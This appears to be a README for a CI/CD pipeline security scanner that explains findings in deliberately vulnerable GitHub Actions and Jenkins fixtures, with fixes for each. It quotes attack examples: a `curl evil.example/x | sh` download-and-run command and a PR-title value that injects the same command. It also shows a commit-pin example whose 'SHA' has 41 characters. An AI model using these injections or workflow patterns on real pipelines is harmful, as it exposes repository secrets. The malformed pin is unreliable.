# PipeSentry — Demo / Write-up

## What it does

PipeSentry reads a folder of CI/CD pipeline files — GitHub Actions
workflow YAML and Jenkinsfiles — and finds the security flaws in them:
dangerous triggers, script injection, unpinned actions, secrets printed
to logs, over-broad permissions and hardcoded Jenkins credentials.
Every finding reports the **file, line number, severity and fix**, plus
a 0–100 score and a grade. It is offline and file-only by default: no network, no
credentials, no live cluster.

## Run it (3 commands)

```bash
python run.py setup
python run.py scan test_workflows/bad      # 38 findings, 0/100 (F)
python run.py scan test_workflows/clean    # 0 findings, 100/100 (A)
```

Or open the menu and press **2** then **3**:

```bash
python pipesentry.py
```

## One finding, explained — PG-001: the pwn request

From `test_workflows/bad/ci.yml`:

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
```

PipeSentry reports:

```
[CRITICAL] PG-001 — pull_request_target checks out PR head code
     ci.yml:17
     job=build:step=checkout
     Evidence: actions/checkout ref=${{ github.event.pull_request.head.sha }}
     checks out PR head code in a pull_request_target workflow
```

**Why this is critical.** `pull_request_target` runs on the base branch
with the repository's secrets and a write-capable `GITHUB_TOKEN` — that
is the whole point of the trigger: it is for trusted automation (labelling
a PR, commenting on it) that needs secrets. But this workflow checks out
`github.event.pull_request.head.sha` — the code from the fork that opened
the PR. Anyone on the internet can open a PR, so anyone on the internet
can now run code with the repository's secrets. A fork author puts
`curl evil.example/x | sh` in the workflow's `run:` step — or simply in
a script the workflow executes — and the secrets are gone.

**The fix.** Split the workflow in two: run untrusted code under plain
`pull_request` (no secrets, read-only token), and do the privileged
part (commenting, labelling, publishing results) in a separate
`workflow_run` job that only downloads one bounded, validated artifact —
never executes it directly.

**How PipeSentry finds it.** It normalises the `on:` trigger (scalar,
list or mapping — and fixes the YAML 1.1 gotcha where `on:` parses as
boolean `True`), walks every job's steps for `actions/checkout`, and
reads the checkout's `ref:` input. A `ref:` pointing at the PR head, an
`allow-unsafe-pr-checkout: true`, or a `run:` block that `git clone`s
the PR in the same job all make it Critical. A plain checkout with no
`ref:` is still flagged, but as High — since checkout v7 the action
itself refuses fork-PR checkouts, so the safety depends on the version.

## The other headline findings in the bad folder

- **PG-004 (Critical)** — `run: 'echo "Thanks: ${{ github.event.pull_request.title }}"'`.
  A PR title is attacker-controlled text; GitHub substitutes it into the
  script *before* the shell sees it, so a title of `"; curl evil/x | sh; #`
  becomes shell code. Quoting does not help. Fix: pass it through `env:`
  and use `"$PR_TITLE"`.
- **PG-005 (High)** — `uses: tj-actions/changed-files@v45`. A tag is a
  mutable pointer. In March 2025 the `tj-actions` tags were rewritten to
  malicious code (CVE-2025-30066) and 23,000+ repositories ran it.
- **PG-007 (High)** — `run: printenv` in a step whose environment holds
  `MY_TOKEN: ${{ secrets.MY_TOKEN }}`. The whole environment, secrets
  included, is dumped to the log.
- **PG-015 (Critical)** — `AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'`
  in the Jenkinsfile, line 6. Anyone with repo read access has the key.
- **PG-016 (High)** — `sh "echo Building ${params.BRANCH}"`. A
  double-quoted Groovy string interpolates `${...}` before the shell
  sees it — the Jenkins equivalent of the GitHub injection above.

## Defensive lesson — pin actions to commit hashes

A tag like `@v4` is a mutable pointer: whoever controls the action repo
can move it, and every pipeline that uses it runs the new code. A full
40-character commit SHA cannot be moved. Pin every third-party action
to its SHA and keep the version as a `# vX.Y.Z` comment, so Dependabot
can still open update PRs:

```yaml
- uses: actions/checkout@11bd71901bb5b9f0c0a34a9daa93a1d2e5b6a7c8d # v4.2.1
```

In March 2025 the `tj-actions/changed-files` tags were rewritten to
malicious code (CVE-2025-30066, CVSS 8.6) and 23,000+ repositories ran
it, dumping secrets into logs. Every one of them would have been safe
on a SHA pin. Pinning is the single cheapest, highest-value habit in
CI/CD security — it costs one line, and it closes the whole supply-chain
attack class that tags leave open.

## Test results

`python run.py test` — **80 checks, all pass** (8 steps: the 7 from the
build plan, plus step 8 for online SHA verification). Bad folder: 38
findings offline (5 critical, 19 high, 12 medium, 2 low), 39 with
`--verify-online` (PG-020 fires once, on the bogus pin in `ci.yml`);
score 0/100, grade F, exit code 2. Clean folder: 0 findings, score
100/100, grade A, exit code 0. Every finding's line number is asserted
against the fixture file it came from.
